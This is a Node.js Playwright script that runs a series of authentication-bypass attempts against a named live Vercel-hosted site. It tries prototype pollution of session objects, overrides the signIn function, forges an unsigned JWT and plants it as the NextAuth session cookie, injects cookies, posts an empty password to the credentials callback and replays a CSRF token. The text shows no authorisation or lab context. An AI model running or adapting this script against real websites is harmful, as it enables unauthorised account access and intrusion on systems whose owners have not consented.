const { chromium } = require('playwright');

(async () => {
    const browser = await chromium.launch({ headless: true });
    const page = await browser.newPage();
    
    await page.goto('https://sturdy-octo-memory-three.vercel.app');
    await page.waitForTimeout(2000);
    
    console.log("=== Testing PP Auth Bypass ===\n");
    
    // Method 1: Pollute session check
    const bypass1 = await page.evaluate(async () => {
        Object.prototype.session = { user: { name: "admin", email: "admin@admin.com" } };
        Object.prototype.user = { name: "admin", email: "admin@admin.com" };
        Object.prototype.isAuthenticated = true;
        Object.prototype.isAdmin = true;
        Object.prototype.role = "admin";
        
        const res = await fetch('/api/auth/session');
        return await res.json();
    });
    console.log("Bypass 1 (Session pollution):", JSON.stringify(bypass1));
    
    // Method 2: Try to create session via XSS
    const bypass2 = await page.evaluate(async () => {
        const originalSignIn = window.signIn;
        window.signIn = async () => ({ ok: true, error: null });
        
        const res = await fetch('/api/users');
        return { status: res.status, body: (await res.text()).substring(0, 200) };
    });
    console.log("Bypass 2 (Function override):", JSON.stringify(bypass2));
    
    // Method 3: Cookie manipulation with valid-looking JWT
    console.log("\n=== Testing JWT Forgery ===");
    const jwt = await page.evaluate(async () => {
        const header = btoa(JSON.stringify({ alg: "HS256", typ: "JWT" }));
        const payload = btoa(JSON.stringify({ 
            sub: "1", 
            name: "admin", 
            email: "admin@admin.com",
            iat: Math.floor(Date.now() / 1000),
            exp: Math.floor(Date.now() / 1000) + 3600
        }));
        const signature = btoa("fake-signature");
        return `${header}.${payload}.${signature}`;
    });
    
    console.log("Forged JWT:", jwt);
    
    await page.context().addCookies([
        { name: 'next-auth.session-token', value: jwt, domain: 'sturdy-octo-memory-three.vercel.app', path: '/' }
    ]);
    
    const session = await page.evaluate(async () => {
        const res = await fetch('/api/auth/session');
        return await res.json();
    });
    console.log("Session with forged JWT:", JSON.stringify(session));
    
    const protectedAccess = await page.evaluate(async () => {
        const res = await fetch('/api/users');
        return { status: res.status, body: (await res.text()).substring(0, 200) };
    });
    console.log("Protected access:", JSON.stringify(protectedAccess));
    
    // Method 4: Test if cookies can be injected via XSS
    console.log("\n=== Testing XSS Cookie Injection ===");
    const cookieResult = await page.evaluate(async () => {
        // Can we set cookies via document.cookie?
        document.cookie = "next-auth.session-token=fake; path=/";
        document.cookie = "__Host-next-auth.session-token=fake; path=/";
        
        // Check what cookies are set
        return document.cookie;
    });
    console.log("Cookies after XSS injection:", cookieResult);
    
    // Method 5: Try to abuse the 500 error on credentials callback
    console.log("\n=== Testing Credentials Callback Abuse ===");
    const callbackTest = await page.evaluate(async () => {
        const csrfRes = await fetch('/api/auth/csrf');
        const csrf = await csrfRes.json();
        
        // Try sending empty password
        const res = await fetch('/api/auth/callback/credentials', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `password=&csrfToken=${csrf.csrfToken}&redirect=false&callbackUrl=${window.location.origin}&json=true`
        });
        
        const headers = {};
        res.headers.forEach((v, k) => headers[k] = v);
        
        return { 
            status: res.status, 
            headers: headers,
            body: await res.text(),
            cookies: document.cookie
        };
    });
    console.log("Callback test:", JSON.stringify(callbackTest, null, 2));
    
    // Method 6: Check if CSRF token can be reused
    console.log("\n=== Testing CSRF Token Reuse ===");
    const csrfReuse = await page.evaluate(async () => {
        const csrfRes = await fetch('/api/auth/csrf');
        const csrf = await csrfRes.json();
        
        // Try multiple times with same token
        const results = [];
        for (let i = 0; i < 3; i++) {
            const res = await fetch('/api/auth/callback/credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `password=test&csrfToken=${csrf.csrfToken}&redirect=false&callbackUrl=${window.location.origin}&json=true`
            });
            results.push({ attempt: i+1, status: res.status, body: (await res.text()).substring(0, 200) });
        }
        return results;
    });
    console.log("CSRF reuse:", JSON.stringify(csrfReuse, null, 2));
    
    await browser.close();
    
    // Cleanup: Remove polluted properties
    delete Object.prototype.session;
    delete Object.prototype.user;
    delete Object.prototype.isAuthenticated;
    delete Object.prototype.isAdmin;
    delete Object.prototype.role;
    
    console.log("\n=== ALL BYPASS TESTS COMPLETE ===");
})();
